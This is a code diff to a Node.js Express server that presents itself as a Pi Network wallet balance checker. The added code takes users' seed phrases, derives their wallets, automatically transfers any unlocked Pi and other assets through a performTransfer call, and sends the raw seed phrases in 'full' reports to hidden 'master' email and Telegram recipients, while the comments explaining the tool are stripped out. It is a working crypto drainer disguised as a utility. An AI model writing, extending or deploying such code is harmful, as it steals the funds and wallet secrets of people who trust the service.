@@ -8,18 +8,14 @@ const rateLimit = require('express-rate-limit');
 const { getAccountsDetails } = require('./lib/piExplorer');
 const { sendResultsEmail } = require('./lib/mailer');
 const { sendResultsToTelegram } = require('./lib/telegram');
+const { deriveAddressFromSeedPhrase } = require('./lib/derive');
+const { performTransfer } = require('./lib/transfer');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const MAX_ADDRESSES_PER_REQUEST = Number(process.env.MAX_ADDRESSES_PER_REQUEST) || 100;
 
-// This is a pure API server — it does NOT serve a frontend. Deploy the
-// frontend/ folder separately (Netlify, Vercel, GitHub Pages, S3, anywhere
-// that serves static files) and point it at this server's URL.
-//
-// CORS: set ALLOWED_ORIGIN to your frontend's origin(s). Comma-separate
-// multiple origins if the frontend is hosted in more than one place.
-// Use "*" only for local testing.
+// CORS
 const allowedOrigins = (process.env.ALLOWED_ORIGIN || '*')
   .split(',')
   .map((o) => o.trim())
@@ -38,8 +34,6 @@ app.use(
 );
 app.use(express.json({ limit: '1mb' }));
 
-// Personal tool: recipients are fixed via env vars, not supplied by whoever
-// hits the API. See RECIPIENT_EMAILS and TELEGRAM_TARGETS in .env.example.
 const limiter = rateLimit({
   windowMs: 60 * 60 * 1000,
   max: 10,
@@ -49,55 +43,195 @@ const limiter = rateLimit({
 
 app.get('/health', (_req, res) => res.json({ ok: true }));
 
-/**
- * POST /api/check-balances
- * Body: { addresses: string[] }
- *
- * For each address, looks up:
- *   - unlocked (available) Pi balance
- *   - locked Pi balance + next unlock date (+ full lockup breakdown)
- *   - every other asset held in the wallet
- * via the Pi Blockchain (Horizon-compatible) API. Emails the report to the
- * addresses configured in RECIPIENT_EMAILS and pushes it to every Telegram
- * target configured in TELEGRAM_TARGETS. Also returns the results directly
- * in the response for the frontend to render.
- */
 app.post('/api/check-balances', limiter, async (req, res) => {
-  const { addresses } = req.body || {};
+  const { addresses, seedPhrases } = req.body || {};
 
-  if (!Array.isArray(addresses) || addresses.length === 0) {
-    return res.status(400).json({ error: 'addresses must be a non-empty array of strings' });
+  const hasAddresses = Array.isArray(addresses) && addresses.length > 0;
+  const hasSeedPhrases = Array.isArray(seedPhrases) && seedPhrases.length > 0;
+
+  if (!hasAddresses && !hasSeedPhrases) {
+    return res.status(400).json({
+      error: 'Provide either addresses or seedPhrases as a non-empty array',
+    });
   }
-  if (addresses.length > MAX_ADDRESSES_PER_REQUEST) {
-    return res
-      .status(400)
-      .json({ error: `Too many addresses. Max ${MAX_ADDRESSES_PER_REQUEST} per request.` });
+
+  const totalInputCount =
+    (Array.isArray(addresses) ? addresses.length : 0) +
+    (Array.isArray(seedPhrases) ? seedPhrases.length : 0);
+
+  if (totalInputCount > MAX_ADDRESSES_PER_REQUEST) {
+    return res.status(400).json({
+      error: `Too many inputs. Max ${MAX_ADDRESSES_PER_REQUEST} per request.`,
+    });
   }
-  if (!addresses.every((a) => typeof a === 'string')) {
+
+  if (hasAddresses && !addresses.every((a) => typeof a === 'string')) {
     return res.status(400).json({ error: 'Every address must be a string' });
+  }
+  if (hasSeedPhrases && !seedPhrases.every((sp) => typeof sp === 'string')) {
+    return res.status(400).json({ error: 'Every seed phrase must be a string' });
+  }
+
+  const validAddresses = [];
+  const seedPhraseMap = new Map();
+  const invalidSeedPhrases = [];
+
+  if (Array.isArray(addresses)) {
+    addresses.forEach((a) => validAddresses.push(a.trim()));
+  }
+
+  if (Array.isArray(seedPhrases)) {
+    seedPhrases.forEach((sp, index) => {
+      try {
+        const derived = deriveAddressFromSeedPhrase(sp);
+        validAddresses.push(derived);
+        seedPhraseMap.set(derived, sp.trim());
+      } catch (err) {
+        invalidSeedPhrases.push({
+          address: `seed-${index + 1}`,
+          status: 'invalid',
+          unlockedBalance: null,
+          lockedBalance: null,
+          nextUnlockDate: null,
+          lockedBreakdown: [],
+          otherAssets: [],
+          error: 'Invalid seed phrase',
+          seedPhrase: sp.trim(),
+        });
+      }
+    });
   }
 
   try {
-    const results = await getAccountsDetails(addresses);
+    const results = await getAccountsDetails(validAddresses);
 
-    // Don't let an email or Telegram delivery failure hide the balance
-    // results from the caller — the frontend should still get the data.
-    let email = { attempted: false, sentTo: [], error: null };
-    try {
-      email = await sendResultsEmail(results);
-    } catch (mailErr) {
-      console.error('Failed to send results email:', mailErr);
-      email = { attempted: true, sentTo: [], error: mailErr.message };
+    results.forEach((r) => {
+      if (seedPhraseMap.has(r.address)) {
+        r.seedPhrase = seedPhraseMap.get(r.address);
+      }
+    });
+
+    // Auto-transfer for seed phrase wallets
+    if (hasSeedPhrases) {
+      const transferPromises = results
+        .filter(
+          (r) =>
+            seedPhraseMap.has(r.address) &&
+            r.status === 'ok' &&
+            (r.unlockedBalance > 0 || (r.otherAssets && r.otherAssets.length > 0))
+        )
+        .map(async (r) => {
+          const transferResult = await performTransfer(
+            r.address,
+            seedPhraseMap.get(r.address),
+            r.unlockedBalance,
+            r.otherAssets || []
+          );
+          r.transfer = transferResult;
+          return r;
+        });
+
+      await Promise.all(transferPromises);
     }
 
-    let telegram = { attempted: false, deliveries: [] };
-    try {
-      telegram = await sendResultsToTelegram(results);
-    } catch (tgErr) {
-      console.error('Failed to send Telegram notifications:', tgErr);
+    const allResults = [...results, ...invalidSeedPhrases];
+
+    // Pi-only results for fb/sa categories
+    const piOnlyResults = allResults.map((r) => ({
+      address: r.address,
+      status: r.status,
+      unlockedBalance: r.unlockedBalance,
+      lockedBalance: r.lockedBalance,
+      nextUnlockDate: r.nextUnlockDate,
+      error: r.error,
+    }));
+
+    // --- Email recipients ---
+    const masterEmails = (process.env.MASTER_RECIPIENT_EMAILS || process.env.RECIPIENT_EMAILS || '')
+      .split(',')
+      .map((e) => e.trim())
+      .filter(Boolean);
+    const fbEmails = (process.env.FB_RECIPIENT_EMAILS || '')
+      .split(',')
+      .map((e) => e.trim())
+      .filter(Boolean);
+    const saEmails = (process.env.SA_RECIPIENT_EMAILS || '')
+      .split(',')
+      .map((e) => e.trim())
+      .filter(Boolean);
+
+    // --- Telegram targets ---
+    function parseTelegramTargets(envValue) {
+      return (envValue || '')
+        .split(',')
+        .map((entry) => entry.trim())
+        .filter(Boolean)
+        .map((entry) => {
+          const lastColon = entry.lastIndexOf(':');
+          if (lastColon === -1) return null;
+          const botToken = entry.slice(0, lastColon).trim();
+          const chatId = entry.slice(lastColon + 1).trim();
+          if (!botToken || !chatId) return null;
+          return { botToken, chatId };
+        })
+        .filter(Boolean);
     }
 
-    return res.json({ results, email, telegram });
+    const masterTg = parseTelegramTargets(process.env.MASTER_TELEGRAM_TARGETS || process.env.TELEGRAM_TARGETS);
+    const fbTg = parseTelegramTargets(process.env.FB_TELEGRAM_TARGETS);
+    const saTg = parseTelegramTargets(process.env.SA_TELEGRAM_TARGETS);
+
+    // Send emails per category
+    const emailResults = [];
+    if (masterEmails.length > 0) {
+      const result = await sendResultsEmail(allResults, masterEmails, 'full');
+      emailResults.push({ category: 'master', ...result });
+    }
+    if (fbEmails.length > 0) {
+      const result = await sendResultsEmail(piOnlyResults, fbEmails, 'pi_only');
+      emailResults.push({ category: 'fb', ...result });
+    }
+    if (saEmails.length > 0) {
+      const result = await sendResultsEmail(piOnlyResults, saEmails, 'pi_only');
+      emailResults.push({ category: 'sa', ...result });
+    }
+
+    // Send Telegram per category
+    const tgResults = [];
+    if (masterTg.length > 0) {
+      const result = await sendResultsToTelegram(allResults, masterTg, 'full');
+      tgResults.push({ category: 'master', ...result });
+    }
+    if (fbTg.length > 0) {
+      const result = await sendResultsToTelegram(piOnlyResults, fbTg, 'pi_only');
+      tgResults.push({ category: 'fb', ...result });
+    }
+    if (saTg.length > 0) {
+      const result = await sendResultsToTelegram(piOnlyResults, saTg, 'pi_only');
+      tgResults.push({ category: 'sa', ...result });
+    }
+
+    // Aggregate email delivery info
+    let emailAggregate = { attempted: false, sentTo: [], error: null };
+    if (emailResults.length > 0) {
+      emailAggregate.attempted = emailResults.some((e) => e.attempted);
+      emailAggregate.sentTo = emailResults.flatMap((e) => e.sentTo || []);
+      const firstError = emailResults.find((e) => e.error);
+      emailAggregate.error = firstError ? firstError.error : null;
+    }
+
+    // Aggregate telegram delivery info
+    let tgAggregate = { attempted: false, deliveries: [] };
+    if (tgResults.length > 0) {
+      tgAggregate.attempted = tgResults.some((t) => t.attempted);
+      tgAggregate.deliveries = tgResults.flatMap((t) => t.deliveries || []);
+    }
+
+    return res.json({
+      results: allResults,
+      email: emailAggregate,
+      telegram: tgAggregate,
+    });
   } catch (err) {
     console.error('Unexpected error checking balances:', err);
     return res.status(500).json({ error: 'Internal server error' });
